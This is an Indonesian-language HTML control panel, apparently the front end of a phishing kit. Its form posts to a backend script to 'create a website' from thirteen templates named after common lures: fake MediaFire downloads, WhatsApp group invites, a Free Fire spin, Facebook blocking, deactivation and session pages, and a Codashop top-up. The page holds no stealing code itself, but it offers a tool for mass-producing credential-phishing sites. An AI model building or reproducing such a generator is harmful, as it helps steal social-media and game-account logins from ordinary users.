<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PANEL CREATE WEBP NEW</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-image: url('img/anime-wahyu.gif');
            background-size: cover;
            background-position: center;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            position: relative; /* Menambahkan posisi relatif untuk elemen berkedip */
        }

        .panel {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .panel label {
            display: block;
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: bold;
        }

        #web-dropdown {
            width: calc(100% - 20px);
            padding: 12px;
            margin-bottom: 20px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 6px;
            background-color: #ffff;
            color: #333;
            appearance: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M7 10l5 5 5-5H7z" /></svg>');
            background-repeat: no-repeat;
            background-position: right 8px top 50%;
            background-size: 18px;
            cursor: pointer;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }

        button {
            flex: 1;
            background-color: #ff77ff; /* Warna tombol */
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-right: 5px;
            transition: background-color 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        button:hover {
            background-color: #ff77ff; /* Warna tombol saat dihover */
        }

        .fa-icon {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
        }

        .copyright {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="panel">
        <form action="proses.php" method="post">
            <label for="web-dropdown">Pilih Nomor/Web:</label>
            <select id="web-dropdown" name="nomor">
                <option value="#">PILIH WEB DARI NOMOR 1-13</option>
                <option value="1">MediaFire MP4</option>
                <option value="2">MediaFire Zip</option>
                <option value="3">Grup Wa V1</option>
                <option value="4">Grup Wa V2</option>
                <option value="5">Grup Wa Freya</option>
                <option value="6">Spin Free Fire</option>
                <option value="7">Pemblokiran Fb New</option>
                <option value="8">Penonaktifan Fb New</option>
                <option value="9">Sesi Facebook</option>
                <option value="10">Codashop FF</option>
                <option value="11">Regedit FF</option>
                <option value="12">Simontok</option>
                <option value="13">Youtube</option>
            </select>
            <div class="button-group">
                <button type="submit" name="buatweb"><i class="fas fa-plus-circle"></i> Buat Web</button>
            </div>
                    <div class="copyright">
            <a href="https://wa.me/6285811538706 target="_blank">&copy; 🌐DANU HOSTING🌐</a>
        </div>
    </div>
        </form>
    </div>
</body>
</html>